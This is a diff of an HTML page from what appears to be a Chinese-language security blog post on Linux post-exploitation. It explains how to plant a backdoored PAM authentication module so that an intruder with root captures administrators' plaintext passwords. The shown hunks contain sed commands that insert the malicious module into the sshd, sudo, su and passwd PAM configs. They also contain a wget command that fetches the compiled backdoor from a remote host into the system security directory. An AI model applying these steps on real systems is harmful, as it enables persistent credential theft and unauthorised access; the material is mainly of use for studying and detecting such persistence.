@@ -44,7 +44,7 @@
 <meta property="og:description" content="前言Linux-PAM是可插入认证模块(Pluggable Authentication Modules)，PAM使用配置/etc/pam.d/下的文件，来管理对程序的认证方式。 根据/etc/pam.d/下的各种服务配置文件，调用/lib/security下相应的模块，以加载动态链接库的形式实现需要的认证方式。 后渗透阶段中，当拿到root权限，刚好管理员只用root账户，想获得管理员密码进行横">
 <meta property="og:locale" content="zh-cn">
 <meta property="og:image" content="https://gorgias.me/2018/03/25/Linux-后渗透笔记-PAM后门/pam_tg.gif">
-<meta property="og:updated_time" content="2018-03-25T14:55:41.000Z">
+<meta property="og:updated_time" content="2018-04-13T04:00:09.505Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux 后渗透笔记 PAM后门">
 <meta name="twitter:description" content="前言Linux-PAM是可插入认证模块(Pluggable Authentication Modules)，PAM使用配置/etc/pam.d/下的文件，来管理对程序的认证方式。 根据/etc/pam.d/下的各种服务配置文件，调用/lib/security下相应的模块，以加载动态链接库的形式实现需要的认证方式。 后渗透阶段中，当拿到root权限，刚好管理员只用root账户，想获得管理员密码进行横">
@@ -139,7 +139,9 @@
 <p>后渗透阶段中，当拿到root权限，刚好管理员只用root账户，想获得管理员密码进行横向渗透时，可以利用PAM获取管理员的明文密码。</p>
 <p><a href="https://github.com/gorgiaxx/sshLooter" target="_blank" rel="external">sshLooter</a>便是通过此方式获取管理员明文密码，但它基于python-pam，实战环境中python环境经常符合预期，而且直接硬编码telegram-bot的token，一旦泄露，可能会被骗入蜜罐，这个工具用起来非常鸡肋，因此有了下面的实践。</p>
 <h2 id="编写后门认证模块"><a href="#编写后门认证模块" class="headerlink" title="编写后门认证模块"></a>编写后门认证模块</h2><p>首先查看系统和PAM版本，不同发行版的版本不同，不一定能通用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div><div class="line">cat /etc/redhat-release</div><div class="line">rpm -qa | grep pam</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div><div class="line">cat /etc/redhat-release</div><div class="line">rpm -qa | grep pam</div><div class="line">apt-get list --installed | grep pam</div></pre></td></tr></table></figure>
+<p>然后vi /etc/ssh/sshd_config，确保UsePAM启用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># Set this to &apos;yes&apos; to enable PAM authentication, account processing,</div><div class="line"># and session processing. If this is enabled, PAM authentication will</div><div class="line"># be allowed through the ChallengeResponseAuthentication mechanism.</div><div class="line"># Depending on your PAM configuration, this may bypass the setting of</div><div class="line"># PasswordAuthentication, PermitEmptyPasswords, and</div><div class="line"># &quot;PermitRootLogin without-password&quot;. If you just want the PAM account and</div><div class="line"># session checks to run without PAM authentication, then enable this but set</div><div class="line"># ChallengeResponseAuthentication=no</div><div class="line">#UsePAM no</div><div class="line">UsePAM yes</div></pre></td></tr></table></figure>
 <p>目前我只在下面两个平台测试过</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pam-0.99.6.2-6.el5_5.2  CentOS release 5.8</div><div class="line">pam-1.1.1-13.el6.x86_64 CentOS release 6.4</div></pre></td></tr></table></figure>
 <p>在PAM源码中，pam_sm_authenticate函数对应认证服务，我们要在这里获得密码。<br>下面是代码，保存为pam_authx.c</p>
@@ -154,7 +156,8 @@
 <blockquote>
 <p>required -<br>failure of such a PAM will ultimately lead to the PAM-API returning failure but only after the remaining stacked modules (for this service and type) have been invoked.</p>
 </blockquote>
-<p>因为上面的代码只是针对pam_sm_authenticate函数的，为了快速编译而写的，所以还是需要用到pam_unix.so模块，它会把密码与/etc/shadow中的哈希对比。<br>接下来在/etc/pam.d/sshd首行加入下面两条配置，根据官方说明，按顺序就行。</p>
+<p>因为上面的代码只是针对pam_sm_authenticate函数的，为了快速编译而写的，所以还是需要用到pam_unix.so模块，它会把密码与/etc/shadow中的哈希对比。<br>接下来在/etc/pam.d/的对应配置文件首行加入下面两条配置，根据官方说明，按顺序就行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Ubuntu</span></div><div class="line">/etc/pam.d/common-auth-ys</div><div class="line"><span class="comment"># CentOS</span></div><div class="line">/etc/pam.d/sshd</div></pre></td></tr></table></figure>
 <blockquote>
 <p>An important feature of PAM, is that a number of rules may be stacked to combine the services of a number of PAMs for a given authentication task.</p>
 </blockquote>
@@ -162,7 +165,7 @@
 <p>这里可以对sshd, sudo, su, passwd等服务加入后门模块，当然后者属于低权限用户，可以使用trace跟踪输入的密码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sed -i <span class="string">"1iauth       required     pam_unix.so\nauth       required     pam_authx.so"</span> /etc/pam.d/sshd</div><div class="line">sed -i <span class="string">"1iauth       required     pam_unix.so\nauth       required     pam_authx.so"</span> /etc/pam.d/sudo</div><div class="line">sed -i <span class="string">"1iauth       required     pam_unix.so\nauth       required     pam_authx.so"</span> /etc/pam.d/su</div><div class="line">sed -i <span class="string">"1iauth       required     pam_unix.so\nauth       required     pam_authx.so"</span> /etc/pam.d/passwd</div></pre></td></tr></table></figure>
 <p>下载目标编辑好的pam后门到目标电脑</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget http://target:8443/download/authx -O /lib64/security/pam_authx.so</div><div class="line">chmod a+x /lib64/security/pam_authx.so</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># CentOS</span></div><div class="line">wget http://target:8443/download/authx -O /lib64/security/pam_authx.so</div><div class="line"><span class="comment"># Ubuntu</span></div><div class="line">wget http://target:8443/download/authx -O /lib/x86_64-linux-gnu/security/pam_authx.so</div><div class="line"></div><div class="line">chmod a+x /lib64/security/pam_authx.so</div></pre></td></tr></table></figure>
 <h2 id="在PAM认证模块源码添加后门"><a href="#在PAM认证模块源码添加后门" class="headerlink" title="在PAM认证模块源码添加后门"></a>在PAM认证模块源码添加后门</h2><p>如果模块无效，可以使用此方法，先查看日志</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tail /var/<span class="built_in">log</span>/secure</div></pre></td></tr></table></figure>
 <p>如果因为版本兼容性原因，可以去这个地址下载对应版本的PAM</p>
